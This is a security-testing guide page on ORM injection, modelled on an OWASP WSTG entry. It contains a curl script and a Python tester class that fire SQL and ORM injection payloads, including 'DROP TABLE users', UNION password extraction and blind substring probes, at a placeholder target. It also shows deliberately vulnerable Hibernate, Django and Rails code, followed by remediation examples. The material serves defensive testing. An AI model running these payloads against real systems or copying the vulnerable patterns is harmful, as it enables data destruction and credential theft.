# WSTG-INPV-05.7: Testing for ORM Injection

## Test ID
WSTG-INPV-05.7

## Test Name
Testing for ORM Injection

## High-Level Description

ORM (Object-Relational Mapping) Injection occurs when attackers exploit vulnerabilities in ORM frameworks (Hibernate, SQLAlchemy, ActiveRecord, Entity Framework) by manipulating query parameters or HQL/JPQL/LINQ queries. Even though ORMs provide abstraction, improper use can still lead to injection vulnerabilities.

---

## What to Check

- [ ] HQL/JPQL injection (Hibernate/JPA)
- [ ] Dynamic query building
- [ ] Raw SQL within ORM
- [ ] Query parameter manipulation
- [ ] Filter/Order injection
- [ ] Mass assignment vulnerabilities

---

## How to Test

### Step 1: Identify ORM Injection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Test common ORM injection patterns
echo "[*] Testing for ORM injection..."

# HQL/JPQL style injection
curl -s "$TARGET/users?filter=' OR '1'='1"
curl -s "$TARGET/users?sort=name; DROP TABLE users--"

# Django ORM injection
curl -s "$TARGET/api/users?ordering=;DROP TABLE users--"

# Ruby/Rails ActiveRecord
curl -s "$TARGET/users?order=name);--"
```

### Step 2: ORM Injection Tester

```python
#!/usr/bin/env python3
"""
ORM Injection Vulnerability Tester
Tests for Hibernate, Django, SQLAlchemy, ActiveRecord injection
"""

import requests
import re

class ORMInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # ORM-specific error patterns
    ORM_ERRORS = {
        'Hibernate': [
            r'org\.hibernate\.QueryException',
            r'javax\.persistence\.PersistenceException',
            r'HibernateQueryException',
            r'unexpected token:',
            r'QuerySyntaxException',
        ],
        'JPA': [
            r'javax\.persistence',
            r'JPA query',
            r'JPQL',
        ],
        'Django': [
            r'django\.db\.utils',
            r'OperationalError',
            r'django\.core\.exceptions',
            r'ProgrammingError',
        ],
        'SQLAlchemy': [
            r'sqlalchemy\.exc',
            r'StatementError',
            r'SQLAlchemyError',
        ],
        'ActiveRecord': [
            r'ActiveRecord::StatementInvalid',
            r'ActiveRecord::RecordNotFound',
            r'PG::SyntaxError',
        ],
        'EntityFramework': [
            r'System\.Data\.Entity',
            r'EntityCommandExecutionException',
            r'EntitySqlException',
        ],
    }

    # ORM injection payloads
    PAYLOADS = {
        'hql_jpql': [
            "' OR '1'='1",
            "' OR ''='",
            "1 OR 1=1",
            "admin' --",
            "' AND 1=1 AND ''='",
            "') OR ('1'='1",
        ],
        'filter_injection': [
            "name; DROP TABLE users--",
            "name DESC; SELECT * FROM users--",
            "name UNION SELECT password FROM users--",
            "id,password",
            "-id",  # Reverse ordering
        ],
        'parameter_manipulation': [
            {"id__gt": 0},  # Django ORM
            {"id[$ne]": ""},  # MongoDB-style through ORM
            {"name__icontains": "admin"},
        ],
    }

    def test_hql_injection(self, param='search'):
        """Test HQL/JPQL injection"""
        print("\n[*] Testing HQL/JPQL injection...")

        for payload in self.PAYLOADS['hql_jpql']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Check for ORM errors
                for orm, patterns in self.ORM_ERRORS.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            print(f"[VULN] {orm} injection detected!")
                            print(f"  Payload: {payload}")
                            self.findings.append({
                                'type': f'{orm} Injection',
                                'payload': payload,
                                'severity': 'High'
                            })
                            return True

                # Check for behavior differences
                if response.status_code == 500:
                    print(f"[INFO] Server error with payload: {payload}")

            except Exception as e:
                pass

        return False

    def test_filter_injection(self):
        """Test filter/orderBy injection"""
        print("\n[*] Testing filter/order injection...")

        filter_params = ['filter', 'sort', 'order', 'orderby', 'ordering', 'sortby']

        for param in filter_params:
            for payload in self.PAYLOADS['filter_injection']:
                try:
                    response = self.session.get(self.url, params={param: payload})

                    # Check for errors
                    for orm, patterns in self.ORM_ERRORS.items():
                        for pattern in patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                print(f"[VULN] Filter injection in '{param}'!")
                                print(f"  Payload: {payload}")
                                self.findings.append({
                                    'type': 'Filter/Order Injection',
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'High'
                                })

                except Exception as e:
                    pass

    def test_django_orm(self):
        """Test Django ORM-specific injection"""
        print("\n[*] Testing Django ORM injection...")

        # Django filter lookups
        lookups = [
            ('id__gt', '0'),
            ('id__lt', '999999'),
            ('name__icontains', 'admin'),
            ('name__regex', '.*'),
            ('name__isnull', 'False'),
            ('password__isnull', 'False'),  # Attempt to access password field
        ]

        for field, value in lookups:
            try:
                response = self.session.get(self.url, params={field: value})

                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[INFO] Django lookup accepted: {field}={value}")

            except Exception as e:
                pass

    def test_raw_sql_in_orm(self):
        """Test for raw SQL execution through ORM"""
        print("\n[*] Testing raw SQL in ORM...")

        raw_payloads = [
            "1; SELECT * FROM users--",
            "1 UNION SELECT password FROM users--",
            "1'; DROP TABLE users;--",
        ]

        for payload in raw_payloads:
            try:
                response = self.session.get(self.url, params={'id': payload})

                # Check for SQL errors
                if re.search(r'SQL|syntax|query', response.text, re.IGNORECASE):
                    print(f"[WARN] Raw SQL might be exposed: {payload}")

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("ORM INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo ORM injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")
                if 'parameter' in f:
                    print(f"  Parameter: {f['parameter']}")

    def run_tests(self):
        """Run all ORM injection tests"""
        self.test_hql_injection()
        self.test_filter_injection()
        self.test_django_orm()
        self.test_raw_sql_in_orm()
        self.generate_report()

# Usage
tester = ORMInjectionTester("https://target.com/api/users")
tester.run_tests()
```

### Step 3: Framework-Specific Payloads

```java
// Hibernate HQL Injection
// Vulnerable code:
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);

// Injection payloads:
' OR '1'='1
' OR ''='
admin' AND substring(password,1,1)='a' AND ''='
admin' AND (SELECT COUNT(*) FROM User)>0 AND ''='
```

```python
# Django ORM Injection
# Vulnerable code (using extra() or raw()):
User.objects.extra(where=["username='%s'" % username])

# Injection via filter kwargs:
# ?filter={"id__gt": 0}

# QuerySet injection:
User.objects.filter(**user_controlled_dict)
```

```ruby
# Rails ActiveRecord Injection
# Vulnerable code:
User.where("name = '#{params[:name]}'")
User.order(params[:sort])

# Injection payloads:
name='; DROP TABLE users;--
sort=name DESC; SELECT * FROM users;--
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Parameter fuzzing |
| SQLMap | Some ORM injection detection |
| Custom scripts | ORM-specific testing |

---

## Remediation

```python
# Django - Use parameterized queries
# VULNERABLE
User.objects.extra(where=["name='%s'" % name])

# SECURE - Use parameter binding
User.objects.extra(where=["name=%s"], params=[name])

# SECURE - Use ORM filter properly
User.objects.filter(name=name)

# SECURE - Whitelist allowed fields for ordering
ALLOWED_SORT_FIELDS = ['name', 'created_at', 'id']
sort_field = request.GET.get('sort', 'id')
if sort_field.lstrip('-') in ALLOWED_SORT_FIELDS:
    queryset = queryset.order_by(sort_field)
```

```java
// Hibernate - Use named parameters
// VULNERABLE
String hql = "FROM User WHERE name = '" + name + "'";

// SECURE - Named parameters
String hql = "FROM User WHERE name = :name";
Query query = session.createQuery(hql);
query.setParameter("name", name);

// SECURE - Criteria API
CriteriaBuilder cb = session.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.select(root).where(cb.equal(root.get("name"), name));
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| HQL/JPQL Injection | 8.6 | High |
| Filter/Order Injection | 7.5 | High |
| Raw SQL in ORM | 9.8 | Critical |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |
| **CWE-943** | Improper Neutralization in Data Query Logic |

---

## Checklist

```
[ ] ORM framework identified
[ ] HQL/JPQL injection tested
[ ] Filter parameters tested
[ ] Order/Sort parameters tested
[ ] Raw SQL detection tested
[ ] Framework-specific payloads used
[ ] Findings documented
```
